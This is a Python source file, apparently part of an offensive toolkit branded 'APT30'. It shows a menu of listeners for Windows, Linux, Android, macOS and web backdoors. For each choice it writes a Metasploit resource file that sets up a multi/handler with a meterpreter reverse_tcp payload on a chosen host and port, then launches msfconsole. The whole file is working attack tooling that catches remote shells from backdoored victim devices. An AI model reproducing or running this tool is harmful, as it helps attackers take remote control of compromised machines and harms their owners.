import os 
def listener():
	print("""
                             888   .d8888b.  .d8888b.  
                             888  d88P  Y88bd88P  Y88b 
                             888       .d88P888    888 
              8888ba 88888ba 888888  88888  888    888 
                 188b888 "88b888       "Y8b.888    888 
LISTENER/----.d888888888  888888  888    888888    888 
             888  888888 d88PY88b.Y88b  d88PY88b  d88P 
             .Y88888888888PP  "Y888"Y8888P"  "Y8888P"  
                     888  
                     888   APT30==>Listener                  
	             888               	    

	1. Listener for Windows Backdoor
	2. Listener for Linux Backdoor
	3. Listener for Android Backdoor
	4. Listener for MacOS Backdoor
	5. Listener for Web Backdoor

	""")
	ch = raw_input("Which Backdoor You want to Listen? APT30#: ")
	if(ch=="1"):
		lhost = raw_input("LHOST: ")
		lport = raw_input("LPORT: ")
		os.chdir('//tmp')
		check_tmp = os.listdir(os.curdir)
		myfile = open('listener.rc', 'w')
		myfile.write ('use exploit/multi/handler\n')
		myfile.write ('set payload windows/meterpreter/reverse_tcp\n')
		myfile.write ('set lhost ' + lhost + '\n' )
		myfile.write ('set lport ' + lport + '\n')
		myfile.write ('exploit')
		myfile.close()
		os.system('msfconsole -r /tmp/listener.rc')
	if(ch=="2"):
		lhost = raw_input("LHOST: ")
		lport = raw_input("LPORT: ")
		os.chdir('//tmp')
		check_tmp = os.listdir(os.curdir)
		myfile = open('listener2.rc', 'w')
		myfile.write ('use exploit/multi/handler\n')
		myfile.write ('set payload python/meterpreter/reverse_tcp\n')
		myfile.write ('set lhost ' + lhost + '\n' )
		myfile.write ('set lport ' + lport + '\n')
		myfile.write ('exploit')
		myfile.close()
		os.system('msfconsole -r /tmp/listener2.rc') 
	if(ch=="3"):
		lhost = raw_input("LHOST: ")
		lport = raw_input("LPORT: ")
		os.chdir('//tmp')
		check_tmp = os.listdir(os.curdir)
		myfile = open('listener3.rc', 'w')
		myfile.write ('use exploit/multi/handler\n')
		myfile.write ('set payload android/meterpreter/reverse_tcp\n')
		myfile.write ('set lhost ' + lhost + '\n' )
		myfile.write ('set lport ' + lport + '\n')
		myfile.write ('exploit')
		myfile.close()
		os.system('msfconsole -r /tmp/listener3.rc') 
	if(ch=="4"):
		lhost = raw_input("LHOST: ")
		lport = raw_input("LPORT: ")
		os.chdir('//tmp')
		check_tmp = os.listdir(os.curdir)
		myfile = open('listener4.rc', 'w')
		myfile.write ('use exploit/multi/handler\n')
		myfile.write ('set payload java/meterpreter/reverse_tcp\n')
		myfile.write ('set lhost ' + lhost + '\n' )
		myfile.write ('set lport ' + lport + '\n')
		myfile.write ('exploit')
		myfile.close()
		os.system('msfconsole -r /tmp/listener4.rc') 
	if(ch=="5"):
		lhost = raw_input("LHOST: ")
		lport = raw_input("LPORT: ")
		os.chdir('//tmp')
		check_tmp = os.listdir(os.curdir)
		myfile = open('listener5.rc', 'w')
		myfile.write ('use exploit/multi/handler\n')
		myfile.write ('set payload php/meterpreter/reverse_tcp\n')
		myfile.write ('set lhost ' + lhost + '\n' )
		myfile.write ('set lport ' + lport + '\n')
		myfile.write ('exploit')
		myfile.close()
		os.system('msfconsole -r /tmp/listener5.rc')  
